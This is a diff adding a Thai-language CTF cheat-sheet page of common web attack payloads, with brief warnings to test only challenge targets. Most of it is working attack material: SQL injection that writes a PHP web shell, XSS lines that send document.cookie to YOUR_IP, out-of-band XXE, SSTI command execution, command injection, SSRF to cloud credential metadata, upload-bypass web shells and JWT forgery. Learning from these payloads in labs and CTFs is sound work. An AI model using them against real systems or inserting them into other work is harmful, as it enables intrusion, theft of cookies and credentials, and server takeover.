@@ -1,0 +1,303 @@
+<!doctype html>
+<html lang="th" data-theme="light">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Common Payloads · Personal Notes</title>
+<meta name="description" content="SQLi / XSS / LFI / SSTI / XXE / SSRF / JWT / upload bypass">
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<div class="wrap">
+  <aside class="sidebar">
+    <a class="brand" href="../index.html">
+      <span class="logo">PN</span>
+      <span><b>Personal Notes</b><small>Cheat sheets · Automation · Tools</small></span>
+    </a>
+    <nav class="nav">
+<a href="../index.html"><span class="ico">🏠</span> หน้าแรก</a>
+<div class="nav-group">
+<div class="label">📌 เริ่มต้น</div>
+<a class="sub" href="../overview.html">ภาพรวมทั้งหมด</a>
+</div>
+<div class="nav-group">
+<div class="label">🚀 Automation</div>
+<a class="sub" href="../Automation/automation_guide.html">Automation — หา Flag ด้วยคำสั่งเดียว</a>
+</div>
+<div class="nav-group">
+<div class="label">🔐 Crypto</div>
+<a class="sub" href="../Crypto/crypto_cheatsheet.html">Crypto Cheatsheet</a>
+</div>
+<div class="nav-group">
+<div class="label">🧪 Forensics</div>
+<a class="sub" href="../Forensics/file_signatures.html">File Signatures</a>
+<a class="sub" href="../Forensics/binwalk_commands.html">binwalk &amp; Carving</a>
+<a class="sub" href="../Forensics/strings_commands.html">strings</a>
+<a class="sub" href="../Forensics/metadata.html">Metadata</a>
+</div>
+<div class="nav-group">
+<div class="label">🌐 Web</div>
+<a class="sub" href="../Web/web_cheatsheet.html">Web Cheatsheet</a>
+<a class="sub active" href="../Web/common_payloads.html">Common Payloads</a>
+<a class="sub" href="../Web/commands.html">Web Commands</a>
+</div>
+<div class="nav-group">
+<div class="label">🧩 Reverse</div>
+<a class="sub" href="../Reverse/reversing_notes.html">Reversing Notes</a>
+<a class="sub" href="../Reverse/common_commands.html">Reverse Commands</a>
+</div>
+<div class="nav-group">
+<div class="label">🔍 OSINT</div>
+<a class="sub" href="../OSINT/methodology.html">OSINT Methodology</a>
+</div>
+<div class="nav-group">
+<div class="label">🧰 Misc</div>
+<a class="sub" href="../Misc/useful_commands.html">Useful Commands</a>
+</div>
+<div class="nav-group"><div class="label">🔎 ค้นหา</div><a class="sub" href="../tools.html">Tools Index</a><a class="sub" href="../index.html#search">ค้นหาทั้งหมด</a></div>
+    </nav>
+  </aside>
+  <div class="main">
+    <header class="topbar">
+      <button class="icon-btn menu-btn" id="menu-btn" aria-label="เมนู">☰</button>
+      <div class="crumb">🌐 Web / <b>Common Payloads</b></div>
+      <button class="icon-btn" id="theme-btn" aria-label="ธีม">🌙</button>
+    </header>
+    <main class="content">
+<div class="toolrow"><a href="../tools.html#curl">curl</a><a href="../tools.html#sqlmap">sqlmap</a><a href="../tools.html#jwt_tool">jwt_tool</a></div>
+<h1 id="common-payloads-payload">Common Payloads — ชุด payload ที่ใช้บ่อย (คัดจากที่เจอจริงในสนาม)</h1>
+<blockquote>
+<p>ใช้เมื่อ: เจอช่องกรอก/พารามิเตอร์ที่น่าสงสัย แล้วต้องทดสอบ
+<strong>ทดสอบกับเป้าหมายในโจทย์เท่านั้น</strong> — ผิดกฎหมายถ้าใช้กับเว็บคนอื่น</p>
+</blockquote>
+<hr />
+<h2 id="1-payload-3">1) ก่อนยิง payload — เช็ก 3 อย่าง</h2>
+<pre><code class="language-bash"># 1) ค่านี้สะท้อนกลับมาในหน้าเว็บไหม (reflection)
+curl -s &quot;http://target/?q=TEST123&quot; | grep TEST123
+
+# 2) มี error ออกมาไหม (error-based)
+curl -s &quot;http://target/?id=1'&quot;
+
+# 3) response ต่างจากปกติไหม (status/length)
+curl -s -o /dev/null -w '%{http_code} %{size_download}\n' &quot;http://target/?id=1&quot;
+curl -s -o /dev/null -w '%{http_code} %{size_download}\n' &quot;http://target/?id=1'&quot;
+</code></pre>
+<hr />
+<h2 id="2-sql-injection">2) SQL Injection</h2>
+<h3 id="21">2.1 ตรวจหา (ตามลำดับ)</h3>
+<pre><code class="language-sql">'                       -- error ไหม
+''                      -- ยัง error ไหม (ถ้าหาย = มีช่องโหว่)
+' OR '1'='1             -- login bypass
+' OR 1=1-- -
+' OR 1=1#
+&quot; OR &quot;1&quot;=&quot;1
+') OR ('1'='1
+</code></pre>
+<h3 id="22-union-based">2.2 Union-based (ต้องรู้จำนวนคอลัมน์ก่อน)</h3>
+<pre><code class="language-sql">' ORDER BY 1-- -         -- เพิ่มเลขไปเรื่อย ๆ จน error = รู้จำนวนคอลัมน์
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT 1,2,3-- -
+' UNION SELECT 1,@@version,3-- -                       -- MySQL
+' UNION SELECT 1,sqlite_version(),3-- -                 -- SQLite
+' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -
+' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
+</code></pre>
+<h3 id="23-blind-time-based">2.3 Blind / Time-based (เมื่อไม่เห็นผลลัพธ์)</h3>
+<pre><code class="language-sql">' AND 1=1-- -            -- หน้าปกติ
+' AND 1=2-- -            -- หน้าว่าง = มี blind SQLi
+' AND SLEEP(5)-- -       -- MySQL (รอ 5 วิ = ใช่)
+'; SELECT pg_sleep(5)-- - -- PostgreSQL
+' AND 1=(SELECT 1 FROM users LIMIT 1)-- -
+</code></pre>
+<h3 id="24-mysql">2.4 อ่านไฟล์ / เขียนไฟล์ (MySQL)</h3>
+<pre><code class="language-sql">' UNION SELECT LOAD_FILE('/etc/passwd'),2-- -
+' UNION SELECT '&lt;?php system($_GET[&quot;c&quot;]); ?&gt;',2 INTO OUTFILE '/var/www/html/s.php'-- -
+</code></pre>
+<h3 id="25-sqlmap">2.5 คำสั่ง sqlmap ที่ใช้บ่อย</h3>
+<pre><code class="language-bash">sqlmap -u &quot;http://target/?id=1&quot; --batch --dbs
+sqlmap -u &quot;http://target/?id=1&quot; --batch -D db -T users --dump
+sqlmap -u &quot;http://target/?id=1&quot; --batch --os-shell        # ระวัง! ใช้เมื่อจำเป็น
+sqlmap -r request.txt --batch --dbs                        # จากไฟล์ request ของ Burp
+</code></pre>
+<hr />
+<h2 id="3-xss-cross-site-scripting">3) XSS (Cross-Site Scripting)</h2>
+<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
+'&gt;&lt;img src=x onerror=alert(1)&gt;
+&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;
+&lt;body onload=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;marquee onstart=alert(1)&gt;
+</code></pre>
+<p><strong>ข้าม filter:</strong></p>
+<pre><code class="language-html">&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;
+&lt;img src=x onerror=&quot;&amp;#97;lert(1)&quot;&gt;
+&lt;svg/onload=alert`1`&gt;
+&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;
+</code></pre>
+<p><strong>โจทย์ที่มี bot ( steal cookie ):</strong></p>
+<pre><code class="language-html">&lt;script&gt;fetch('http://YOUR_IP:8000/?c='+document.cookie)&lt;/script&gt;
+&lt;img src=x onerror=&quot;fetch('http://YOUR_IP:8000/?c='+document.cookie)&quot;&gt;
+</code></pre>
+<pre><code class="language-bash"># ฝั่งเรา: เปิด listener รับ cookie
+python3 -m http.server 8000
+</code></pre>
+<hr />
+<h2 id="4-lfi-path-traversal">4) LFI / Path Traversal</h2>
+<pre><code>../../../../etc/passwd
+../../../../../../etc/passwd
+....//....//....//etc/passwd          # หลบ filter ที่ลบ ../
+..%2f..%2f..%2fetc%2fpasswd           # URL encode
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+/etc/passwd%00                        # null byte (PHP &lt; 5.3.4)
+</code></pre>
+<p><strong>PHP wrapper (สำคัญมากในโจทย์ CTF):</strong></p>
+<pre><code>php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=config.php
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
+expect://id
+zip://upload.zip%23shell.php
+phar://upload.phar/shell.php
+</code></pre>
+<pre><code class="language-bash"># อ่านซอร์สแล้วถอด base64
+curl -s &quot;http://target/?page=php://filter/convert.base64-encode/resource=index.php&quot; | base64 -d
+</code></pre>
+<p><strong>ไฟล์ที่ควรลองอ่าน:</strong></p>
+<pre><code>/etc/passwd
+/etc/hostname
+/proc/self/environ
+/proc/self/cmdline
+/var/www/html/index.php
+/var/www/html/config.php
+/home/&lt;user&gt;/.ssh/id_rsa
+</code></pre>
+<hr />
+<h2 id="5-command-injection">5) Command Injection</h2>
+<pre><code class="language-bash">; id
+| id
+|| id
+&amp; id
+&amp;&amp; id
+`id`
+$(id)
+%0a id              # newline
+127.0.0.1;cat${IFS}/flag.txt
+127.0.0.1|cat$IFS/flag.txt
+</code></pre>
+<p><strong>เมื่อถูกกรองช่องว่าง:</strong></p>
+<pre><code class="language-bash">127.0.0.1;cat${IFS}/flag.txt
+127.0.0.1;cat&lt;/flag.txt
+127.0.0.1;{cat,/flag.txt}
+127.0.0.1;$IFS
+</code></pre>
+<p><strong>อ่าน flag เร็ว ๆ:</strong></p>
+<pre><code class="language-bash">127.0.0.1;cat /flag* 2&gt;/dev/null;ls -la /;env
+</code></pre>
+<hr />
+<h2 id="6-ssti-server-side-template-injection">6) SSTI (Server-Side Template Injection)</h2>
+<pre><code>{{7*7}}          -&gt; 49 = มีช่องโหว่ (Jinja2/Twig)
+${7*7}           -&gt; 49 = FreeMarker / JSP EL
+&lt;%= 7*7 %&gt;       -&gt; 49 = ERB (Ruby)
+#{7*7} -&gt; 49 = Ruby / Thymeleaf
+{{7*'7'}}        -&gt; 7777777 = Jinja2 (ไม่ใช่ Twig)
+</code></pre>
+<p><strong>Jinja2 (Python/Flask) ไล่ต่อ:</strong></p>
+<pre><code>{{config}}
+{{config.items()}}
+{{''.__class__.__mro__}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{lipsum.__globals__['os'].popen('cat /flag').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}
+</code></pre>
+<hr />
+<h2 id="7-xxe-xml-external-entity">7) XXE (XML External Entity)</h2>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;
+</code></pre>
+<p>แบบ OOB (เมื่อไม่เห็นผลในหน้าเว็บ):</p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &quot;http://YOUR_IP:8000/evil.dtd&quot;&gt; %xxe; ]&gt;
+</code></pre>
+<hr />
+<h2 id="8-ssrf-server-side-request-forgery">8) SSRF (Server-Side Request Forgery)</h2>
+<pre><code>http://127.0.0.1/admin
+http://localhost/admin
+http://127.0.0.1:8080/
+http://169.254.169.254/latest/meta-data/           # AWS metadata
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://[::1]/admin
+http://0.0.0.0/admin
+http://127.1/admin
+file:///etc/passwd
+gopher://127.0.0.1:6379/_INFO
+dict://127.0.0.1:11211/stat
+</code></pre>
+<hr />
+<h2 id="9-file-upload-bypass">9) File Upload Bypass</h2>
+<pre><code>shell.php
+shell.php5
+shell.phtml
+shell.phar
+shell.PHP
+shell.php.jpg
+shell.jpg.php
+shell.php%00.jpg
+shell.php.
+.htaccess            # สั่งให้ .jpg รันเป็น php
+</code></pre>
+<p><code>.htaccess</code> ที่ใช้ได้:</p>
+<pre><code>AddType application/x-httpd-php .jpg
+</code></pre>
+<p><strong>ตรวจ magic bytes</strong> (ถ้ากรอง header):</p>
+<pre><code class="language-bash"># เติม GIF header หน้าไฟล์ php
+printf 'GIF89a;' &gt; shell.php
+cat &gt;&gt; shell.php &lt;&lt;'PHP'
+&lt;?php system($_GET['c']); ?&gt;
+PHP
+</code></pre>
+<hr />
+<h2 id="10-jwt">10) JWT</h2>
+<pre><code class="language-bash"># 1) ถอดดู
+jwt_tool &lt;token&gt;
+
+# 2) alg=none
+python3 - &lt;&lt;'PY'
+import base64, json
+def b64(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
+print(b64({&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}) + &quot;.&quot; + b64({&quot;role&quot;:&quot;admin&quot;}) + &quot;.&quot;)
+PY
+
+# 3) crack secret แบบ offline
+jwt_tool &lt;token&gt; -C -d /usr/share/wordlists/rockyou.txt
+
+# 4) เซ็นใหม่ด้วย secret ที่ crack ได้
+jwt_tool &lt;token&gt; -S hs256 -p '&lt;secret&gt;' -I -pc role -pv admin
+</code></pre>
+<hr />
+<h2 id="11-php-deserialization">11) PHP Deserialization</h2>
+<pre><code class="language-php">O:4:&quot;User&quot;:2:{s:4:&quot;name&quot;;s:5:&quot;guest&quot;;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;}
+</code></pre>
+<ul>
+<li>หา class ที่มี <code>__wakeup()</code> / <code>__destruct()</code> ในซอร์ส</li>
+<li>ปรับค่า property ให้เป็น <code>admin</code></li>
+<li>ส่งผ่าน cookie/param ที่ unserialize</li>
+</ul>
+<hr />
+<h2 id="12">12) หมายเหตุความปลอดภัย</h2>
+<ul>
+<li>payload พวกนี้ใช้กับ <strong>เป้าหมายในโจทย์</strong> เท่านั้น</li>
+<li><code>--os-shell</code>, <code>INTO OUTFILE</code>, การลบไฟล์ = ทำให้ระบบเสียหาย ใช้เมื่อโจทย์ต้องการจริง ๆ</li>
+<li>ถ้าโจทย์ให้ VPN/ขอบเขต IP มา ให้อยู่ในขอบเขตนั้นเท่านั้น</li>
+<li>เก็บ payload ที่ได้ผลไว้ในไฟล์ <code>notes.md</code> ของคุณ (เอาไว้เขียน writeup)</li>
+</ul>
+<div class="pager"><a class="prev" href="../Web/web_cheatsheet.html"><span>ก่อนหน้า</span>Web Cheatsheet</a><a class="next" href="../Web/commands.html"><span>ถัดไป</span>Web Commands</a></div>
+      <div class="footer">แก้ไขเนื้อหาได้ที่ไฟล์ <code>Web/common_payloads.md</code> แล้วรัน <code>python3 build.py</code> ใหม่ · หน้านี้สร้างแบบ static ไม่ต้องต่อเน็ต</div>
+    </main>
+  </div>
+</div>
+<script src="../assets/site.js"></script>
+</body>
+</html>
